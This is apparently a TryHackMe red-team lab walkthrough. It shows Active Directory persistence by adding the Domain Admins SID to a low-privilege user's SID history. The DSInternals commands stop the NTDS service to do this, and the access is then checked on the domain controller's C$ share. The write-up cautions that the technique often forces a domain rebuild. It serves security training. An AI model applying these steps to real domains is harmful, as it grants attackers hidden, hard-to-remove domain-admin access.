# Persistence through SID history

**A quick note here. These techniques are incredibly invasive and hard to remove. Even if you have sign-off on your red team exercise to perform these techniques, you must take the utmost caution when performing these techniques. In real-world scenarios, the exploitation of most of these techniques would result in a full domain rebuild. Make sure you fully understand the consequences of using these techniques and only perform them if you have prior approval on your assessment, and they are deemed necessary. In most cases, a red team exercise would be dechained at this point instead of using these techniques. Meaning you would most likely not perform these persistence techniques but rather simulate them.**

This one is:

* Not easily removed except by RSAT tooling
* Difficult to find, not easily detected

The legitimate use case of SID history is to enable access for an account to effectively be cloned to another. 
This becomes useful when an organisation is busy performing an AD migration as it allows users to retain access to 
the original domain while they are being migrated to the new one. In the new domain, the user would have a new SID, 
but we can add the user's existing SID in the SID history, which will still allow them to access resources in the 
previous domain using their new account. While SID history is good for migrations, we, as attackers, can also abuse 
this feature for persistence.

One way to abuse this feature is to add the SID of a privileged group – like the Domain Admins group – to the SID 
history of a low-level user. Even though the user is not a member of the group in AD, the system will authorise them 
as if they were due to the group SID being in their history.

SSH into the domain controller using the given administrator credentials:

    ssh administrator@za.tryhackme.loc@thmdc.za.tryhackme.loc

Inspect the SID history and group membership of the [unprivileged account from the credential distributor](setup.md).

    powershell -ep bypass
    
    Get-ADUser 'user.name' -Properties sidhistory,memberof

The `SIDHistory` property is an empty list `{}` and the `MemberOf` property shows that this user is only a member of the 
`Internet Access` group.

Get the `SID` of the `Domain Admins` group.

    Get-ADGroup 'Domain Admins'

Use the `DSInternals` PowerShell module to add the `Domain Admins` `SID` to the user's `SID history`:

    Import-Moduls DSInternals

Can not modify the SID history while the NTDS database is running:

    Stop-Service ntds -Force

Add the SID to the low privilege account's SID history:

    Add-ADDBSidHistory -SamAccountName 'donald.ross' -SidHistory 'S-1-5-21-3885271727-2693558621-2658995185-512' -DatabasePath 'C:\Windows\NTDS\ntds.dit'

Restart the NTDS database:

    Start-Service ntds

SSH to `thmwrk1` to test the new privileges:

    ssh user.name@za.tryhackme.loc@thmwrk1.za.tryhackme.loc

Check access to a privileged resource on the domain controller:

    dir \\thmdc.za.tryhackme.loc\c$\Users

## Resources

* [Sneaky Active Directory Persistence #14: SID History](https://adsecurity.org/?p=1772)